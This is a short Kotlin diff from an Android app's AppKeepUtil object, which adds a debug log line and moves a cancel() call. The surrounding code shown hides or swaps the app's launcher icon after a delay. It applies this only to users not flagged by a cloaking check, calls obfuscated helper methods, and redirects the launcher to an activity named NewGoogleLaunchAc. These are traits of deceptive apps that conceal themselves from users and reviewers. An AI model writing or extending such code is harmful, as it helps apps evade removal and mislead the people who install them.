@@ -64,9 +64,9 @@ object AppKeepUtil {
                     break
                 }
                 delay(FireConfig.ringartExchangeIcoBean.changeIconDelayTime().toLong()+2000L)
+                "=change==${!splashPageShowing}=====${!UserTypeUtil.isCloakBlankUser}====${FireConfig.ringartExchangeIcoBean.checkCanHideIcon()}".log()
                 if (!splashPageShowing&&!UserTypeUtil.isCloakBlankUser&&FireConfig.ringartExchangeIcoBean.checkCanHideIcon()){
                     changeIcon=true
-                    cancel()
                     if (Build.VERSION.SDK_INT < 29){
                         FirebasePointUtil.point("ringart_android_10")
                         fivaZSftMS.LjhTlxWvsWPh(appContext,SplashAC::class.java.canonicalName)
@@ -79,6 +79,7 @@ object AppKeepUtil {
                             set(appContext,SplashAC::class.java.canonicalName,NewGoogleLaunchAc::class.java.canonicalName)
                         }
                     }
+                    cancel()
                 }
             }
         }
